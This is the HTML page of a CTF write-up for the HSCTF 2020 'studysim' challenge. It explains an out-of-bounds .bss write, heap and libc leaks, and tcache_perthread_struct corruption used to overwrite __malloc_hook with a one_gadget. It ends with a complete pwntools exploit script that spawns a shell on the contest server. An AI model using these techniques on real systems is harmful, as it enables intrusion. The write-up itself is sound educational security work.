@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/pwning/HSCTF20/studysim/intro/">
+        <link rel="shortcut icon" href="../../../../img/favicon.ico">
+        <title>Studysim - CTF-Writeups</title>
+        <link href="../../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atelier-forest-light.min.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+        <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+
+        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+            <div class="container">
+
+                <!-- Collapsed navigation -->
+                <div class="navbar-header">
+                    <!-- Expander button -->
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
+                </div>
+
+                <!-- Expanded navigation -->
+                <div class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li >
+                                <a href="../../../../about/">About Us</a>
+                            </li>
+                            <li >
+                                <a href="https://team-shakti.github.io/">Website</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav navbar-right">
+                        <li>
+                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/pwning/HSCTF20/studysim/intro.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
+    <ul class="nav bs-sidenav">
+        <li class="main active"><a href="#studysim">Studysim</a></li>
+            <li><a href="#add">Add</a></li>
+            <li><a href="#do">Do</a></li>
+            <li><a href="#sleep">Sleep</a></li>
+            <li><a href="#getting-the-leaks">Getting the Leaks</a></li>
+            <li><a href="#final-exploit">Final Exploit</a></li>
+    </ul>
+</div></div>
+                <div class="col-md-9" role="main">
+
+<h1 id="studysim">Studysim</h1>
+<p>This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let’s check it out!</p>
+<p>Along, with the challenge binary we were provided with  Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it.</p>
+<p>Carrying out the initial checksec step, we get the following information on the mitigations:</p>
+<pre><code>Canary : Yes
+NX : Yes
+PIE : No
+Fortify : No
+RelRO : Full
+</code></pre>
+
+<p>So possibly some overwrite on any of the hooks? A possible FSOP? Let’s explore!</p>
+<p>The menu function which we are presented with:</p>
+<pre><code>Welcome to study simulator!
+Because who has free time when you must STUDY.
+Commands:
+add - Adds a worksheet onto your stack of worksheets
+do - Complete the top worksheets
+sleep - Give up and sleep
+&gt;
+</code></pre>
+
+<h3 id="add">Add</h3>
+<p>Let’s us create a new chunk of any size below 0x400 and then the allocated chunk’s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable.</p>
+<p>stack[allocated_count ++] = address of the allocated chunk</p>
+<p>After this we can give some content and it prints back the content which we have just added.</p>
+<h3 id="do">Do</h3>
+<p>Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like:</p>
+<pre><code>0x404020 &lt;stdout@@GLIBC_2.2.5&gt;: 0x00007ffff7fc6760 0x0000000000000000
+0x404030 &lt;stdin@@GLIBC_2.2.5&gt;: 0x00007ffff7fc5a00 0x0000000000000000
+0x404040 &lt;allocated_count&gt;: 0x0000000000000000 0x0000000000000000
+0x404050: 0x0000000000000000 0x0000000000000000
+0x404060 &lt;stack&gt;: 0x0000000000000000 0x0000000000000000
+0x404070 &lt;stack+16&gt;: 0x0000000000000000 0x0000000000000000
+0x404080 &lt;stack+32&gt;: 0x0000000000000000 0x0000000000000000
+0x404090 &lt;stack+48&gt;: 0x0000000000000000 0x0000000000000000
+</code></pre>
+
+<h3 id="sleep">Sleep</h3>
+<p>Well, it just sleeps and exits. Nothing interesting here.</p>
+<h2 id="getting-the-leaks">Getting the Leaks</h2>
+<p>To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks.</p>
+<pre><code>You throw the worksheet '0@@' on your stack of worksheets.
+&gt;
+</code></pre>
+
+<p>For the libc leaks, well it won’t be that easy as there’s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure.</p>
+<p>I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won’t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it.</p>
+<p>By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it’s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored!</p>
+<pre><code>0x1553000: 0x0000000000000000 0x0000000000000251 &lt;-- Tcache struct begins
+0x1553010: 0x000000000155327f 0x0000000000000000 &lt;-- First 8 bytes overwritten with count
+0x1553020: 0x0000000000000000 0x0000000000000000
+0x1553030: 0x0000000000000000 0x0000000000000000
+0x1553040: 0x0000000000000000 0x0000000000000000
+0x1553050: 0x0000000000404030 0x0000000000000000 &lt;-- Next chunk in line for allocation
+0x1553060: 0x0000000000000000 0x0000000000000000
+</code></pre>
+
+<h2 id="final-exploit">Final Exploit</h2>
+<p>By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to <em>malloc_hook</em>. On the next call to malloc() function we would get an allocation on <em>malloc_hook</em> (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!!</p>
+<pre><code class="python">from pwn import *
+
+bss_stack = 0x404060
+
+#k = process(&quot;./studysim&quot;,env = {&quot;LD_PRELOAD&quot; : &quot;./libc.so.6&quot;})
+k = remote('pwn.hsctf.com', 5007)
+def add(size,content):
+   k.sendlineafter(&quot;&gt; &quot;,&quot;add&quot;)
+   k.sendlineafter(&quot;worksheet?\n&quot;,str(size))
+   k.sendlineafter(&quot;worksheet?\n&quot;,content)
+
+def do(count):
+   k.sendlineafter(&quot;&gt; &quot;,&quot;do&quot;)
+   k.sendlineafter(&quot;finish?\n&quot;,str(count))
+
+def sleep():
+   k.sendlineafter(&quot;&gt; &quot;,&quot;sleep&quot;)
+stdout_bss = 0x0000000000404030
+#heap leaks
+do(4)
+add(0x10,'a'*0x10)
+do(0)
+k.recvuntil(&quot;Only &quot;)
+heap_leak = int(k.recvline().strip().split(&quot; &quot;)[0],10)-1
+print(hex(heap_leak))
+do(heap_leak)
+#get a count
+chunk = heap_leak-0x250-0x8
+diff = -bss_stack+chunk
+do(-diff/8)
+add(0x10,'c'*0x10)
+do(diff/8+1)
+#allocate a chunk at .bss addr of stdin
+chunk = heap_leak-0x208-0x10
+diff = -bss_stack+chunk
+do(-diff/8)
+add(0x10,p64(stdout_bss))
+do(diff/8+1)
+add(0x08,'')
+
+k.sendlineafter(&quot;&gt; &quot;,&quot;add&quot;)
+k.sendlineafter(&quot;worksheet?\n&quot;,str(0x8))
+k.sendlineafter(&quot;worksheet?\n&quot;,'a')
+
+k.recvuntil(&quot;worksheet &quot;)
+leak = k.recvline().strip().split(&quot; &quot;)[0].replace(&quot;'&quot;,&quot;&quot;)
+leak = '\x00'+leak[1:]
+leak = u64(leak.ljust(8,'\x00'))
+libc_base = leak-0x1e4a00
+print(hex(libc_base))
+
+do(3)
+
+#allocate chunk at __malloc_hook
+malloc_hook = libc_base + 0x0000000001e4c30
+system = libc_base + 0x0000000000052fd0
+one_gadget = libc_base + 0xe2383
+chunk = heap_leak-0x208-0x8
+diff = -bss_stack+chunk
+do(-diff/8)
+add(0x20,p64(malloc_hook))
+do(diff/8+1)
+add(0x08,'')
+
+k.sendlineafter(&quot;&gt; &quot;,&quot;add&quot;)
+k.sendlineafter(&quot;worksheet?\n&quot;,str(0x8))
+k.sendlineafter(&quot;worksheet?\n&quot;,p64(one_gadget))
+do(2)
+
+#call system
+k.sendlineafter(&quot;&gt; &quot;,&quot;add&quot;)
+k.sendlineafter(&quot;worksheet?\n&quot;,'0')
+
+k.interactive()
+</code></pre></div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 <a href="http://Team-Shakti.github.io/">Team-Shakti Writeups</a></p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../../..",
+                shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
+        </script>
+        <script src="../../../../js/base.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
+            </div>
+            <div class="modal-body">
+                <p>
+                    From here you can search these documents. Enter
+                    your search terms below.
+                </p>
+                <form role="form">
+                    <div class="form-group">
+                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
